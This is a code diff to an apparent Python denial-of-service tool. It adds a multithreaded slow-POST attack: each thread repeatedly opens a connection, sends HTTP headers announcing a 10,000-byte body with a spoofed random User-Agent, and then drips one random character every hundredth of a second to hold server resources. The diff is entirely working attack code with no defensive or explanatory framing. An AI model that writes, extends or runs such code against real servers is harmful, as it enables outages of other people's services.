@@ -1,4 +1,5 @@
 import threading
+import string
 import random
 import socket
 import time
@@ -39,6 +40,29 @@ def send_get_requests(i: int, ip: str, port: int, path: str) -> None:
             sock.send(str.encode(request))
 
 
+def send_post_requests(i: int, ip: str, port: int, path: str) -> None:
+    global flag
+
+    while flag != 1:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((ip, port))
+
+            request = 'POST ' + path + ' HTTP/1.1\r\n'
+            request += 'HOST: ' + ip + '\r\n'
+            request += 'Connection: keep-alive\r\n'
+            request += 'Cache-Control: no-cache\r\n'
+            request += 'Content-Length: 10000\r\n'
+            request += 'User-Agent: ' + random.choice(UserAgentList.USER_AGENT_LIST) + '\r\n'
+            request += '\r\n'
+
+            sock.send(str.encode(request))
+
+            for i in range(10000):
+                payload = random.choice(string.ascii_letters + string.digits)
+                sock.send(payload.encode('utf-8'))
+                time.sleep(0.01)
+
+
 def run(url: str, method: str, t_count: int, n: int):
     ip, port, path = url_parser(url)
     print(ip, port, path)
@@ -50,6 +74,8 @@ def run(url: str, method: str, t_count: int, n: int):
     for i in range(t_count):
         if method == 'get':
             t = threading.Thread(target=send_get_requests, args=(i, ip, port, path, ))
+        elif method == 'post':
+            t = threading.Thread(target=send_post_requests, args=(i, ip, port, path, ))
 
         threads.append(t)
         t.start()
